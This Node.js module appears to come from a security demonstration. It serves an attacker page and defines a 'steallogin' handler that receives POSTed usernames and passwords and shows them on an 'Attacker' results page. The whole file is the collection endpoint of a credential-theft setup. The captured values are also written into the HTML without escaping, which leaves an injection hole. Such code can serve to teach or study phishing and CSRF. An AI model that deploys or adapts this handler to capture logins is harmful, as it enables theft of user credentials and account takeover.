var fs = require('fs');
var qs = require('querystring');

/*
 * attackerserver()
 *
 * Sends attackerserver html response to user
 *
 * response = html format
 */
function attackerserver(response) {
	fs.readFile('./attackerserver.html', function(error,data){
		response.end(data);
	});
}

/*	steallogin()
 *
 *	Called from attackerserver.html, outputs the received,
 *	and stolen username and password.
 *
 *	response = html format
 *	request = username and password
 */
function steallogin(response, request){
	if (request.method == 'POST') {										// Receive all request data 
		var procPost = '';
		request.on('data', function(chunk) {
			procPost += chunk;

			if (procPost.length > 1e6)
				request.connection.destroy();
		});

		request.on('end', function() {									// Finished receiving all request data
			var Data = function(un, pwd) {
				this.userName = un;
				this.password = pwd;
			}

			var loginData = qs.parse(procPost,'\r\n','=');				// Parse the incoming POST
			var seedData = new Data(loginData['username'],
			   						loginData['password']);				// Mongo Object

			// Output information on another url
			var body = '<html>'+'<head><h2 align="center"><font color="red">Attacker</font></head>'+
				'<body><p><font color="red"><br><br><h3 align="center">Username: ' + seedData.userName +
		   		'<br>Password: ' + seedData.password + '</h3></p></body></html>';

			response.writeHead(404, {'Content-Type': 'text/html'});
			response.write(body);
			response.end();
		});
	} else {
		response.writeHead(404, {"Content-Type": "text/html"});
		response.write('<html><body><h2 text-align="center">Invalid access to url</h2></body></html>');
		response.end();
	}
}

exports.attackerserver = attackerserver;
exports.steallogin = steallogin;

